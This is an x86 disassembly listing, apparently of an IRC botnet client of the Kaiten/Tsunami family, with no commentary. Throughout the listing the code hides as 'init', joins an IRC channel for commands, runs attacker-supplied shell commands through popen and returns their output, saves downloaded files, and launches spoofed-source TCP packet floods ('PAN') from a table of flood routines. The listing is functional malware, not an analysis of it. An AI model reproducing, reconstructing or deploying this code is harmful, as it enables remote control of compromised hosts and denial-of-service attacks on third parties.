mov eax, dword [arg_8h]
mov dword [esp], eax
call sym.Send
mov eax, dword [filename]
add eax, 8
mov eax, dword [eax]
mov dword [stream], 0x804c9a8
mov dword [esp], eax
call sym.imp.fopen
mov dword [var_1ch], eax
mov dword [flags], 0
mov dword [protocol], 0x1000
lea eax, [var_143ch]
mov dword [stream], eax
mov eax, dword [fildes]
mov dword [esp], eax
call sym.imp.recv
mov dword [var_14h], eax
cmp dword [var_14h], 0
jle 0x804998e
cmp dword [var_14h], 0xfff
jg 0x80498ed
mov eax, dword [var_14h]
mov byte [ebp + eax - 0x143c], 0
mov dword [var_24h], 0
jmp 0x804997d
mov eax, dword [var_24h]
mov edx, eax
lea eax, [var_143ch]
add eax, edx
mov dword [var_145ch], eax
mov dword [var_1460h], str._r_n_r_n
mov dword [var_1464h], 4
cld
mov esi, dword [var_145ch]
mov edi, dword [var_1460h]
mov ecx, dword [var_1464h]
repe cmpsb byte [esi], byte ptr es:[edi]
seta dl
setb al
mov ecx, edx
sub cl, al
mov eax, ecx
movsx eax, al
test eax, eax
jne 0x8049979
add dword [var_24h], 4
jmp 0x804996f
mov eax, dword [var_24h]
movzx eax, byte [ebp + eax - 0x143c]
movzx edx, al
mov eax, dword [var_1ch]
mov dword [stream], eax
mov dword [esp], edx
call sym.imp.fputc
add dword [var_24h], 1
mov eax, dword [var_24h]
cmp eax, dword [var_14h]
jl 0x804994e
jmp 0x804998e
add dword [var_24h], 1
mov eax, dword [var_24h]
cmp eax, dword [var_14h]
jl 0x80498f9
jmp 0x80498a7
mov eax, dword [filename]
add eax, 8
mov eax, dword [eax]
mov dword [flags], eax
mov eax, dword [arg_ch]
mov dword [protocol], eax
mov dword [stream], str.NOTICE__s_:Saved_as__s_n
mov eax, dword [arg_8h]
mov dword [esp], eax
call sym.Send
mov dword [flags], 0
mov dword [protocol], 0x1000
lea eax, [var_143ch]
mov dword [stream], eax
mov eax, dword [fildes]
mov dword [esp], eax
call sym.imp.recv
mov dword [var_10h], eax
cmp dword [var_10h], 0
jle 0x8049a2a
cmp dword [var_10h], 0xfff
jg 0x80499f6
mov eax, dword [var_10h]
mov byte [ebp + eax - 0x143c], 0
mov dword [var_bp_ch], 0
jmp 0x8049a20
mov eax, dword [var_bp_ch]
movzx eax, byte [ebp + eax - 0x143c]
movzx edx, al
mov eax, dword [var_1ch]
mov dword [stream], eax
mov dword [esp], edx
call sym.imp.fputc
add dword [var_bp_ch], 1
mov eax, dword [var_bp_ch]
cmp eax, dword [var_10h]
jl 0x80499ff
jmp 0x80499b4
mov eax, dword [var_1ch]
mov dword [esp], eax
call sym.imp.fclose
mov eax, dword [fildes]
mov dword [esp], eax
call sym.imp.close
mov dword [esp], 0
call sym.imp.exit
add esp, 0x1470
pop esi
pop edi
pop ebp
ret
jmp dword [reloc.strcpy]
jmp dword [reloc.connect]
jmp dword [reloc.fopen]
jmp dword [reloc.fputc]
jmp dword [reloc.fclose]
push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0x89c
mov dword [size], 0
jmp 0x804b585
add dword [size], 1
mov edx, dword [size]
mov eax, dword [arg_10h]
mov ecx, 0xffffffff
mov dword [var_860h], eax
mov eax, 0
cld
mov edi, dword [var_860h]
repne scasb al, byte es:[edi]
mov eax, ecx
not eax
sub eax, 1
cmp edx, eax
jae 0x804b5bc
mov eax, dword [size]
add eax, dword [arg_10h]
movzx eax, byte [eax]
cmp al, 0x20
jne 0x804b581
mov eax, dword [size]
add eax, dword [arg_10h]
mov byte [eax], 0
mov eax, dword [arg_10h]
mov dword [s1], eax
mov eax, dword [size]
add eax, dword [arg_10h]
add eax, 2
mov dword [var_1ch], eax
mov dword [size], 0
jmp 0x804b5e4
add dword [size], 1
mov edx, dword [size]
mov eax, dword [arg_ch]
mov ecx, 0xffffffff
mov dword [var_864h], eax
mov eax, 0
cld
mov edi, dword [var_864h]
repne scasb al, byte es:[edi]
mov eax, ecx
not eax
sub eax, 1
cmp edx, eax
jae 0x804b61b
mov eax, dword [size]
add eax, dword [arg_ch]
movzx eax, byte [eax]
cmp al, 0x21
jne 0x804b5e0
mov eax, dword [size]
add eax, dword [arg_ch]
mov byte [eax], 0
mov eax, dword [var_1ch]
movzx eax, byte [eax]
cmp al, 0x21
jne 0x804badb
mov eax, dword [obj.chan]
mov dword [format], eax
mov eax, dword [s1]
mov dword [esp], eax
call sym.imp.strcasecmp
test eax, eax
jne 0x804badb
lea edx, [s]
mov eax, 0x400
mov dword [stream], eax
mov dword [format], 0
mov dword [esp], edx
call sym.imp.memset
mov dword [var_18h], 0
add dword [var_1ch], 1
mov dword [size], 0
jmp 0x804b685
add dword [size], 1
mov edx, dword [size]
mov eax, dword [var_1ch]
mov ecx, 0xffffffff
mov dword [var_868h], eax
mov eax, 0
cld
mov edi, dword [var_868h]
repne scasb al, byte es:[edi]
mov eax, ecx
not eax
sub eax, 1
cmp edx, eax
jae 0x804b6bc
mov eax, dword [size]
add eax, dword [var_1ch]
movzx eax, byte [eax]
cmp al, 0x20
jne 0x804b681
mov eax, dword [size]
add eax, dword [var_1ch]
mov byte [eax], 0
mov eax, dword [obj.nick]
mov dword [format], eax
mov eax, dword [var_1ch]
mov dword [esp], eax
call sym.strwildmatch
test eax, eax
jne 0x804badb
mov edx, dword [var_1ch]
add edx, 1
mov eax, dword [size]
lea eax, [edx + eax]
mov dword [var_1ch], eax
mov eax, dword [var_1ch]
mov dword [var_86ch], eax
mov dword [var_870h], str.IRC_
mov dword [var_874h], 4
cld
mov esi, dword [var_86ch]
mov edi, dword [var_870h]
mov ecx, dword [var_874h]
repe cmpsb byte [esi], byte ptr es:[edi]
seta dl
setb al
mov ecx, edx
sub cl, al
mov eax, ecx
movsx eax, al
test eax, eax
jne 0x804b779
movzx eax, byte [obj.disabled]
test al, al
je 0x804b75c
mov eax, dword [arg_ch]
mov dword [stream], eax
mov dword [format], str.NOTICE__s_:Unable_to_comply._n
mov eax, dword [arg_8h]
mov dword [esp], eax
call sym.Send
jmp 0x804b779
mov eax, dword [var_1ch]
add eax, 4
mov dword [stream], eax
mov dword [format], 0x804d028
mov eax, dword [arg_8h]
mov dword [esp], eax
call sym.Send
mov eax, dword [var_1ch]
mov dword [var_878h], eax
mov dword [var_87ch], 0x804d02c
mov dword [var_880h], 3
cld
mov esi, dword [var_878h]
mov edi, dword [var_87ch]
mov ecx, dword [var_880h]
repe cmpsb byte [esi], byte ptr es:[edi]
seta dl
setb al
mov ecx, edx
sub cl, al
mov eax, ecx
movsx eax, al
test eax, eax
jne 0x804b8bf
mov eax, dword [arg_ch]
mov dword [esp], eax
call sym.mfork
test eax, eax
jne 0x804badb
mov dword [stream], 0x400
mov dword [format], 0
lea eax, [filename]
mov dword [esp], eax
call sym.imp.memset
mov eax, dword [var_1ch]
add eax, 3
mov dword [stream], eax
mov dword [format], str.export_PATH_bin:_sbin:_usr_bin:_usr_local_bin:_usr_sbin__s
lea eax, [filename]
mov dword [esp], eax
call sym.imp.sprintf
mov dword [format], 0x804c7a9
lea eax, [filename]
mov dword [esp], eax
call sym.imp.popen
mov dword [var_10h], eax
jmp 0x804b899
mov dword [stream], 0x400
mov dword [format], 0
lea eax, [filename]
mov dword [esp], eax
call sym.imp.memset
mov eax, dword [var_10h]
mov dword [stream], eax
mov dword [format], 0x400
lea eax, [filename]
mov dword [esp], eax
call sym.imp.fgets
lea eax, [filename]
mov dword [var_ch], eax
mov eax, dword [arg_ch]
mov dword [stream], eax
mov dword [format], str.NOTICE__s_:_s_n
mov eax, dword [arg_8h]
mov dword [esp], eax
call sym.Send
mov dword [esp], 1
call sym.imp.sleep
mov eax, dword [var_10h]
mov dword [esp], eax
call sym.imp.feof
test eax, eax
je 0x804b82e
mov eax, dword [var_10h]
mov dword [esp], eax
call sym.imp.pclose
mov dword [esp], 0
call sym.imp.exit
mov eax, dword [var_1ch]
mov ecx, 0xffffffff
mov dword [var_884h], eax
mov eax, 0
cld
mov edi, dword [var_884h]
repne scasb al, byte es:[edi]
mov eax, ecx
not eax
sub eax, 1
mov dword [var_14h], eax
mov dword [size], 0
jmp 0x804b91a
mov eax, dword [var_1ch]
movzx eax, byte [eax]
cmp al, 0x20
je 0x804b922
mov eax, dword [var_1ch]
movzx eax, byte [eax]
test al, al
je 0x804b922
mov eax, dword [size]
mov edx, dword [var_1ch]
movzx edx, byte [edx]
mov byte [ebp + eax - 0x454], dl
add dword [var_1ch], 1
add dword [size], 1
mov eax, dword [size]
cmp eax, dword [var_14h]
jl 0x804b8ee
mov dword [size], 0
jmp 0x804b940
mov eax, dword [size]
add eax, dword [var_1ch]
movzx eax, byte [eax]
cmp al, 0x20
jne 0x804b93c
add dword [var_18h], 1
add dword [size], 1
mov edx, dword [size]
mov eax, dword [var_1ch]
mov ecx, 0xffffffff
mov dword [var_888h], eax
mov eax, 0
cld
mov edi, dword [var_888h]
repne scasb al, byte es:[edi]
mov eax, ecx
not eax
sub eax, 1
cmp edx, eax
jb 0x804b92b
add dword [var_18h], 1
cmp dword [var_18h], 0xa
jle 0x804b97b
mov dword [var_18h], 0xa
lea eax, [s]
mov dword [dest], eax
mov eax, dword [var_18h]
add eax, 1
mov dword [ebp + eax*4 - 0x54], 0x804d07b
mov dword [var_14h], 1
jmp 0x804ba3e
add dword [var_1ch], 1
mov eax, dword [var_14h]
cmp eax, dword [var_18h]
jge 0x804ba4c
mov dword [size], 0
jmp 0x804b9bb
add dword [size], 1
mov edx, dword [size]
mov eax, dword [var_1ch]
mov ecx, 0xffffffff
mov dword [var_88ch], eax
mov eax, 0
cld
mov edi, dword [var_88ch]
repne scasb al, byte es:[edi]
mov eax, ecx
not eax
sub eax, 1
cmp edx, eax
jae 0x804b9f2
mov eax, dword [size]
add eax, dword [var_1ch]
movzx eax, byte [eax]
cmp al, 0x20
jne 0x804b9b7
mov ebx, dword [var_14h]
mov eax, dword [size]
add eax, 1
mov dword [esp], eax
call sym.imp.malloc
mov dword [ebp + ebx*4 - 0x54], eax
mov edx, dword [size]
mov eax, dword [var_14h]
mov ecx, dword [ebp + eax*4 - 0x54]
mov dword [stream], edx
mov eax, dword [var_1ch]
mov dword [format], eax
mov dword [esp], ecx
call sym.imp.strncpy
mov eax, dword [var_14h]
mov edx, dword [ebp + eax*4 - 0x54]
mov eax, dword [size]
lea eax, [edx + eax]
mov byte [eax], 0
add dword [var_14h], 1
mov eax, dword [size]
add dword [var_1ch], eax
mov eax, dword [var_1ch]
movzx eax, byte [eax]
test al, al
jne 0x804b99e
mov dword [var_14h], 0
jmp 0x804bac9
mov eax, dword [var_14h]
mov edx, dword [eax*8 + obj.flooders]
lea eax, [s]
mov dword [format], eax
mov dword [esp], edx
call sym.imp.strcasecmp
test eax, eax
jne 0x804bac5
mov eax, dword [var_14h]
mov ecx, dword [eax*8 + 0x804e3e4]
mov edx, dword [var_18h]
sub edx, 1
lea eax, [dest]
mov dword [var_ch], eax
mov dword [stream], edx
mov eax, dword [arg_ch]
mov dword [format], eax
mov eax, dword [arg_8h]
mov dword [esp], eax
call ecx
mov dword [size], 1
jmp 0x804babb
mov eax, dword [size]
mov eax, dword [ebp + eax*4 - 0x54]
mov dword [esp], eax
call sym.imp.free
add dword [size], 1
mov eax, dword [size]
cmp eax, dword [var_18h]
jl 0x804baa8
jmp 0x804badb
add dword [var_14h], 1
mov eax, dword [var_14h]
mov eax, dword [eax*8 + obj.flooders]
test eax, eax
jne 0x804ba55
add esp, 0x89c
pop ebx
pop esi
pop edi
pop ebp
ret
push ebp
mov ebp, esp
push edi
push esi
sub esp, 0x50
mov eax, dword [arg_10h]
mov dword [s1], eax
mov dword [var_18h], 0
mov dword [var_14h], 0
jmp 0x804bbf2
add dword [s1], 1
add dword [var_18h], 1
mov edx, dword [var_18h]
mov eax, dword [arg_10h]
mov ecx, 0xffffffff
mov dword [var_2ch], eax
mov eax, 0
cld
mov edi, dword [var_2ch]
repne scasb al, byte es:[edi]
mov eax, ecx
not eax
sub eax, 1
cmp edx, eax
jae 0x804bbc2
mov eax, dword [s1]
movzx eax, byte [eax]
cmp al, 0x20
jne 0x804bb8c
add dword [s1], 1
mov edx, dword [var_18h]
mov eax, dword [arg_10h]
mov ecx, 0xffffffff
mov dword [var_30h], eax
mov eax, 0
cld
mov edi, dword [var_30h]
repne scasb al, byte es:[edi]
mov eax, ecx
not eax
sub eax, 1
cmp edx, eax
je 0x804bddb
add dword [var_14h], 1
cmp dword [var_14h], 4
jle 0x804bb94
mov dword [var_18h], 0
jmp 0x804bc05
add dword [var_18h], 1
mov edx, dword [var_18h]
mov eax, dword [s1]
mov ecx, 0xffffffff
mov dword [var_34h], eax
mov eax, 0
cld
mov edi, dword [var_34h]
repne scasb al, byte es:[edi]
mov eax, ecx
not eax
sub eax, 1
cmp edx, eax
jae 0x804bc36
mov eax, dword [var_18h]
add eax, dword [s1]
movzx eax, byte [eax]
cmp al, 0x20
jne 0x804bc01
mov eax, dword [var_18h]
add eax, dword [s1]
mov byte [eax], 0
mov eax, dword [obj.nick]
mov dword [s2], eax
mov eax, dword [s1]
mov dword [esp], eax
call sym.imp.strcasecmp
test eax, eax
jne 0x804bddb
mov eax, dword [obj.spoofsm]
test eax, eax
jne 0x804bddb
mov eax, dword [arg_10h]
mov dword [s1], eax
mov dword [var_18h], 0
mov dword [var_14h], 0
jmp 0x804bce4
add dword [s1], 1
add dword [var_18h], 1
mov edx, dword [var_18h]
mov eax, dword [arg_10h]
mov ecx, 0xffffffff
mov dword [var_38h], eax
mov eax, 0
cld
mov edi, dword [var_38h]
repne scasb al, byte es:[edi]
mov eax, ecx
not eax
sub eax, 1
cmp edx, eax
jae 0x804bcb4
mov eax, dword [s1]
movzx eax, byte [eax]
cmp al, 0x20
jne 0x804bc7e
add dword [s1], 1
mov edx, dword [var_18h]
mov eax, dword [arg_10h]
mov ecx, 0xffffffff
mov dword [var_3ch], eax
mov eax, 0
cld
mov edi, dword [var_3ch]
repne scasb al, byte es:[edi]
mov eax, ecx
not eax
sub eax, 1
cmp edx, eax
je 0x804bddb
add dword [var_14h], 1
cmp dword [var_14h], 2
jle 0x804bc86
mov dword [var_18h], 0
jmp 0x804bcf7
add dword [var_18h], 1
mov edx, dword [var_18h]
mov eax, dword [s1]
mov ecx, 0xffffffff
mov dword [var_40h], eax
mov eax, 0
cld
mov edi, dword [var_40h]
repne scasb al, byte es:[edi]
mov eax, ecx
not eax
sub eax, 1
cmp edx, eax
jae 0x804bd28
mov eax, dword [var_18h]
add eax, dword [s1]
movzx eax, byte [eax]
cmp al, 0x20
jne 0x804bcf3
mov eax, dword [var_18h]
add eax, dword [s1]
mov byte [eax], 0
mov eax, dword [s1]
mov dword [esp], eax
call sym.imp.inet_addr
mov dword [var_1ch], eax
mov eax, dword [var_1ch]
cmp eax, 0xffffffff
jne 0x804bd93
mov eax, dword [s1]
mov dword [esp], eax
call sym.imp.gethostbyname
mov dword [var_ch], eax
cmp dword [var_ch], 0
jne 0x804bd79
mov eax, dword [obj.chan]
mov dword [var_8h], eax
mov dword [s2], str.NOTICE__s_:Im_having_a_problem_resolving_my_host__someone_will_have_to_SPOOFS_me_manually._n
mov eax, dword [arg_8h]
mov dword [esp], eax
call sym.Send
jmp 0x804bddb
mov eax, dword [var_ch]
mov eax, dword [eax + 0xc]
mov ecx, eax
mov eax, dword [var_ch]
mov eax, dword [eax + 0x10]
mov edx, dword [eax]
lea eax, [var_1ch]
mov edi, eax
mov esi, edx
cld
rep movsb byte es:[edi], byte ptr [esi]
mov eax, obj.spoofs
lea edx, [eax + 3]
lea eax, [var_1ch]
movzx eax, byte [eax]
mov byte [edx], al
mov eax, obj.spoofs
lea edx, [eax + 2]
lea eax, [var_1ch]
add eax, 1
movzx eax, byte [eax]
mov byte [edx], al
mov eax, obj.spoofs
lea edx, [eax + 1]
lea eax, [var_1ch]
add eax, 2
movzx eax, byte [eax]
mov byte [edx], al
mov eax, obj.spoofs
mov byte [eax], 0
mov dword [obj.spoofsm], 0x100
add esp, 0x50
pop esi
pop edi
pop ebp
ret
push ebp
mov ebp, esp
push ebx
sub esp, 0x24
mov eax, dword [arg_8h]
movzx eax, byte [eax]
movsx eax, al
mov dword [var_18h], eax
cmp dword [var_18h], 0x2a
je 0x8048d4f
cmp dword [var_18h], 0x3f
je 0x8048da6
cmp dword [var_18h], 0
je 0x8048d3e
jmp 0x8048de4
mov eax, dword [arg_ch]
movzx eax, byte [eax]
movsx eax, al
mov dword [var_14h], eax
jmp 0x8048e3e
mov eax, dword [arg_8h]
add eax, 1
mov edx, dword [arg_ch]
mov dword [var_4h], edx
mov dword [esp], eax
call sym.strwildmatch
test eax, eax
je 0x8048d94
mov eax, dword [arg_ch]
movzx eax, byte [eax]
test al, al
je 0x8048d8b
mov eax, dword [arg_ch]
add eax, 1
mov dword [var_4h], eax
mov eax, dword [arg_8h]
mov dword [esp], eax
call sym.strwildmatch
test eax, eax
je 0x8048d94
mov dword [var_10h], 1
jmp 0x8048d9b
mov dword [var_10h], 0
mov eax, dword [var_10h]
mov dword [var_14h], eax
jmp 0x8048e3e
mov eax, dword [arg_ch]
movzx eax, byte [eax]
test al, al
je 0x8048dcc
mov eax, dword [arg_ch]
add eax, 1
mov edx, dword [arg_8h]
add edx, 1
mov dword [var_4h], eax
mov dword [esp], edx
call sym.strwildmatch
test eax, eax
je 0x8048dd5
mov dword [var_ch], 1
jmp 0x8048ddc
mov dword [var_ch], 0
mov eax, dword [var_ch]
mov dword [var_14h], eax
jmp 0x8048e3e
mov eax, dword [arg_8h]
movzx eax, byte [eax]
movsx eax, al
mov dword [esp], eax
call sym.imp.toupper
mov ebx, eax
mov eax, dword [arg_ch]
movzx eax, byte [eax]
movsx eax, al
mov dword [esp], eax
call sym.imp.toupper
cmp ebx, eax
jne 0x8048e28
mov eax, dword [arg_ch]
add eax, 1
mov edx, dword [arg_8h]
add edx, 1
mov dword [var_4h], eax
mov dword [esp], edx
call sym.strwildmatch
test eax, eax
je 0x8048e31
mov dword [var_8h], 1
jmp 0x8048e38
mov dword [var_8h], 0
mov eax, dword [var_8h]
mov dword [var_14h], eax
mov eax, dword [var_14h]
add esp, 0x24
pop ebx
pop ebp
ret
push ebp
mov ebp, esp
sub esp, 0x118
lea ecx, [s1]
mov edx, obj.C.68.5014
mov eax, 0x50
mov dword [protocol], eax
mov dword [type], edx
mov dword [esp], ecx
call sym.imp.memcpy
mov dword [var_28h], 0
mov dword [var_24h], 0x14
mov dword [esp], 0
call sym.imp.time
mov dword [var_bp_8h], eax
mov eax, dword [arg_ch]
mov dword [esp], eax
call sym.mfork
test eax, eax
jne 0x804a56c
cmp dword [arg_10h], 2
jg 0x804a205
mov eax, dword [arg_ch]
mov dword [protocol], eax
mov dword [type], str.NOTICE__s_:PAN__target___port___secs__n
mov eax, dword [arg_8h]
mov dword [esp], eax
call sym.Send
mov dword [esp], 1
call sym.imp.exit
mov dword [protocol], 0xff
mov dword [type], 3
mov dword [esp], 2
call sym.imp.socket
mov dword [var_ch], eax
cmp dword [var_ch], 0
jns 0x804a236
mov dword [esp], 1
call sym.imp.exit
mov dword [var_bp_4h], 0
jmp 0x804a254
mov edx, dword [var_bp_4h]
mov eax, dword [var_bp_4h]
mov eax, dword [ebp + eax*4 - 0xf8]
mov byte [ebp + edx - 0x3c], al
add dword [var_bp_4h], 1
cmp dword [var_bp_4h], 0x13
jle 0x804a23f
mov eax, dword [str]
add eax, 4
mov eax, dword [eax]
mov dword [type], eax
mov eax, dword [arg_ch]
mov dword [esp], eax
call sym.host2ip
mov dword [var_14h], eax
mov eax, dword [str]
add eax, 0xc
mov eax, dword [eax]
mov dword [esp], eax
call sym.imp.atol
mov dword [var_10h], eax
mov eax, dword [str]
add eax, 4
mov eax, dword [eax]
mov dword [var_sp_ch], eax
mov eax, dword [arg_ch]
mov dword [protocol], eax
mov dword [type], str.NOTICE__s_:Panning__s._n
mov eax, dword [arg_8h]
mov dword [esp], eax
call sym.Send
movzx eax, byte [var_64h]
and eax, 0xfffffff0
or eax, 5
mov byte [var_64h], al
movzx eax, byte [var_64h]
and eax, 0xf
or eax, 0x40
mov byte [var_64h], al
mov byte [var_63h], 0x10
mov word [var_5eh], 0x40
mov byte [var_5ch], 0x40
mov byte [var_5bh], 6
mov dword [var_48h], 0
movzx eax, byte [var_44h]
and eax, 0xf
or eax, 0xffffffa0
mov byte [var_44h], al
movzx eax, byte [var_44h]
and eax, 0xfffffff0
mov byte [var_44h], al
movzx eax, byte [var_43h]
and eax, 0x7f
mov byte [var_43h], al
movzx eax, byte [var_43h]
and eax, 0xffffffbf
mov byte [var_43h], al
movzx eax, byte [var_43h]
and eax, 0xffffffdf
mov byte [var_43h], al
movzx eax, byte [var_43h]
and eax, 0xffffffef
mov byte [var_43h], al
movzx eax, byte [var_43h]
and eax, 0xfffffff7
mov byte [var_43h], al
movzx eax, byte [var_43h]
and eax, 0xfffffffb
mov byte [var_43h], al
movzx eax, byte [var_43h]
and eax, 0xfffffffe
mov byte [var_43h], al
movzx eax, byte [var_43h]
or eax, 2
mov byte [var_43h], al
mov word [var_42h], 0x787d
mov word [var_3eh], 0
mov eax, dword [str]
add eax, 8
mov eax, dword [eax]
mov dword [esp], eax
call sym.imp.atoi
movzx eax, ax
mov dword [esp], eax
call sym.imp.htons
movzx eax, ax
mov dword [var_1ch], eax
call sym.imp.rand
mov dword [var_20h], eax
mov eax, dword [str]
add eax, 8
mov eax, dword [eax]
mov dword [esp], eax
call sym.imp.atoi
test eax, eax
jne 0x804a398
call sym.imp.rand
mov dword [var_1ch], eax
call sym.getspoof
mov dword [var_18h], eax
mov eax, dword [var_24h]
add eax, 0x28
movzx eax, ax
mov dword [esp], eax
call sym.imp.htons
mov word [var_62h], ax
call sym.imp.rand
mov word [var_60h], ax
mov eax, dword [var_18h]
mov dword [var_58h], eax
mov eax, dword [var_14h]
mov dword [var_54h], eax
mov word [var_5ah], 0
mov eax, dword [var_20h]
mov word [var_50h], ax
mov eax, dword [var_1ch]
mov word [var_4eh], ax
call sym.imp.rand
mov dword [var_4ch], eax
mov word [var_40h], 0
mov word [var_a8h], 2
mov eax, dword [var_1ch]
mov word [var_a6h], ax
mov eax, dword [var_54h]
mov dword [var_a4h], eax
lea eax, [var_64h]
mov dword [type], 0x14
mov dword [esp], eax
call sym.in_cksum
mov word [var_5ah], ax
call sym.imp.rand
mov dword [var_fch], eax
lea eax, [var_fch]
movzx eax, byte [eax]
mov byte [var_33h], al
lea eax, [var_fch]
add eax, 1
movzx eax, byte [eax]
mov byte [var_32h], al
lea eax, [var_fch]
add eax, 2
movzx eax, byte [eax]
mov byte [var_31h], al
lea eax, [var_fch]
add eax, 3
movzx eax, byte [eax]
mov byte [var_30h], al
mov eax, dword [var_58h]
mov dword [var_98h], eax
mov eax, dword [var_54h]
mov dword [var_94h], eax
mov byte [var_90h], 0
mov byte [var_8fh], 6
mov eax, dword [var_24h]
add eax, 0x14
movzx eax, ax
mov dword [esp], eax
call sym.imp.htons
mov word [var_8eh], ax
lea eax, [var_98h]
lea edx, [eax + 0xc]
lea eax, [var_64h]
add eax, 0x14
mov dword [protocol], 0x14
mov dword [type], edx
mov dword [esp], eax
call sym.imp.bcopy
mov eax, dword [var_24h]
mov dword [protocol], eax
lea eax, [var_98h]
add eax, 0x20
mov dword [type], eax
lea eax, [var_64h]
add eax, 0x28
mov dword [esp], eax
call sym.imp.bcopy
mov eax, dword [var_24h]
add eax, 0x20
lea edx, [var_98h]
mov dword [type], eax
mov dword [esp], edx
call sym.in_cksum
mov word [var_40h], ax
lea eax, [var_a8h]
mov edx, dword [var_24h]
add edx, 0x28
mov dword [var_sp_14h], 0x10
mov dword [var_sp_10h], eax
mov dword [var_sp_ch], 0
mov dword [protocol], edx
lea eax, [var_64h]
mov dword [type], eax
mov eax, dword [var_ch]
mov dword [esp], eax
call sym.imp.sendto
cmp dword [var_28h], 0x31
jbe 0x804a563
mov dword [esp], 0
call sym.imp.time
mov edx, eax
mov eax, dword [var_bp_8h]
add eax, dword [var_10h]
cmp edx, eax
jb 0x804a55c
mov dword [esp], 0
call sym.imp.exit
mov dword [var_28h], 0
add dword [var_28h], 1
jmp 0x804a374
leave
ret
mov ebx, dword [esp]
ret
push ebp
mov ebp, esp
push edi
sub esp, 0x24
cmp dword [arg_10h], 1
je 0x804b293
mov eax, dword [arg_ch]
mov dword [n], eax
mov dword [src], str.NOTICE__s_:DISABLE__pass__n
mov eax, dword [arg_8h]
mov dword [esp], eax
call sym.Send
movzx eax, byte [obj.disabled]
test al, al
je 0x804b266
mov dword [var_bp_8h], str.Disabled
jmp 0x804b26d
mov dword [var_bp_8h], str.Enabled_and_awaiting_orders
mov eax, dword [var_bp_8h]
mov dword [var_sp_ch], eax
mov eax, dword [arg_ch]
mov dword [n], eax
mov dword [src], str.NOTICE__s_:Current_status_is:__s._n
mov eax, dword [arg_8h]
mov dword [esp], eax
call sym.Send
jmp 0x804b350
movzx eax, byte [obj.disabled]
test al, al
je 0x804b2bd
mov eax, dword [arg_ch]
mov dword [n], eax
mov dword [src], str.NOTICE__s_:Already_disabled._n
mov eax, dword [arg_8h]
mov dword [esp], eax
call sym.Send
jmp 0x804b350
mov eax, dword [arg_14h]
add eax, 4
mov eax, dword [eax]
mov ecx, 0xffffffff
mov dword [var_ch], eax
mov eax, 0
cld
mov edi, dword [var_ch]
repne scasb al, byte es:[edi]
mov eax, ecx
not eax
sub eax, 1
cmp eax, 0xfe
jbe 0x804b302
mov eax, dword [arg_ch]
mov dword [n], eax
mov dword [src], str.NOTICE__s_:Password_too_long____254_n
mov eax, dword [arg_8h]
mov dword [esp], eax
call sym.Send
jmp 0x804b350
mov byte [obj.disabled], 1
mov dword [n], 0x100
mov dword [src], 0
mov dword [esp], obj.dispass
call sym.imp.memset
mov eax, dword [arg_14h]
add eax, 4
mov eax, dword [eax]
mov dword [src], eax
mov dword [esp], obj.dispass
call sym.imp.strcpy
mov dword [src], str.NOTICE__s_:Disable_sucessful._n
mov eax, dword [arg_8h]
mov dword [esp], eax
call sym.Send
add esp, 0x24
pop edi
pop ebp
ret
lea ecx, [argv]
and esp, 0xfffffff0
push dword [ecx - 4]
push ebp
mov ebp, esp
push edi
push ebx
push ecx
sub esp, 0x19ec
mov dword [var_19d0h], ecx
call sym.imp.fork
test eax, eax
je 0x804c13e
mov dword [esp], 0
call sym.imp.exit
mov edx, dword [var_19d0h]
mov eax, dword [edx + 4]
mov eax, dword [eax]
mov ecx, 0xffffffff
mov dword [var_19d4h], eax
mov eax, 0
cld
mov edi, dword [var_19d4h]
repne scasb al, byte es:[edi]
mov eax, ecx
not eax
lea edx, [eax - 1]
mov ecx, dword [var_19d0h]
mov eax, dword [ecx + 4]
mov eax, dword [eax]
mov dword [writefds], edx
mov dword [wstatus], str.init
mov dword [esp], eax
call sym.imp.strncpy
mov dword [s], 1
jmp 0x804c1eb
mov eax, dword [s]
shl eax, 2
mov edi, dword [var_19d0h]
add eax, dword [edi + 4]
mov eax, dword [eax]
mov ecx, 0xffffffff
mov dword [var_19d8h], eax
mov eax, 0
cld
mov edi, dword [var_19d8h]
repne scasb al, byte es:[edi]
mov eax, ecx
not eax
lea edx, [eax - 1]
mov eax, dword [s]
shl eax, 2
mov ecx, dword [var_19d0h]
add eax, dword [ecx + 4]
mov eax, dword [eax]
mov dword [writefds], edx
mov dword [wstatus], 0
mov dword [esp], eax
call sym.imp.memset
add dword [s], 1
mov eax, dword [s]
mov edi, dword [var_19d0h]
cmp eax, dword [edi]
jl 0x804c191
mov dword [esp], 0
call sym.imp.time
mov ebx, eax
call sym.imp.getpid
xor ebx, eax
call sym.imp.getppid
lea eax, [ebx + eax]
mov dword [esp], eax
call sym.imp.srand
call sym.makestring
mov dword [obj.nick], eax
call sym.makestring
mov dword [obj.ident], eax
call sym.makestring
mov dword [obj.user], eax
mov dword [obj.chan], 0x804d127
mov dword [obj.key], 0x804d12c
mov dword [obj.server], 0
jmp 0x804c25b
call sym.con
mov eax, dword [obj.user]
mov edx, dword [obj.ident]
mov ecx, dword [obj.nick]
mov ebx, dword [obj.sock]
mov dword [timeout], eax
mov dword [exceptfds], edx
mov dword [writefds], ecx
mov dword [wstatus], str.NICK__s_nUSER__s_localhost_localhost_:_s_n
mov dword [esp], ebx
call sym.Send
jmp 0x804c295
mov eax, 0
mov ecx, 0x20
lea edi, [var_1c0h]
cld
rep stosd dword es:[edi], eax
mov dword [var_24h], ecx
mov dword [var_20h], edi
mov eax, dword [obj.sock]
mov edx, eax
shr edx, 5
mov eax, dword [obj.sock]
and eax, 0x1f
bts dword [ebp + edx*4 - 0x1c0], eax
mov dword [var_140h], 0x4b0
mov dword [var_13ch], 0
mov eax, dword [obj.sock]
lea edx, [eax + 1]
lea eax, [var_140h]
mov dword [timeout], eax
mov dword [exceptfds], 0
mov dword [writefds], 0
lea eax, [var_1c0h]
mov dword [wstatus], eax
mov dword [esp], edx
call sym.imp.select
test eax, eax
jle 0x804c25b
mov dword [var_28h], 0
jmp 0x804c41d
mov eax, dword [var_28h]
shl eax, 2
mov edx, eax
mov eax, dword [obj.pids]
lea eax, [edx + eax]
mov eax, dword [eax]
mov dword [writefds], 1
mov dword [wstatus], 0
mov dword [esp], eax
call sym.imp.waitpid
test eax, eax
jle 0x804c419
mov eax, dword [var_28h]
add eax, 1
mov dword [var_18h], eax
jmp 0x804c38a
mov eax, dword [obj.pids]
lea edx, [eax - 4]
mov eax, dword [var_18h]
shl eax, 2
lea ecx, [edx + eax]
mov eax, dword [var_18h]
shl eax, 2
mov edx, eax
mov eax, dword [obj.pids]
lea eax, [edx + eax]
mov eax, dword [eax]
mov dword [ecx], eax
add dword [var_18h], 1
mov eax, dword [obj.numpids]
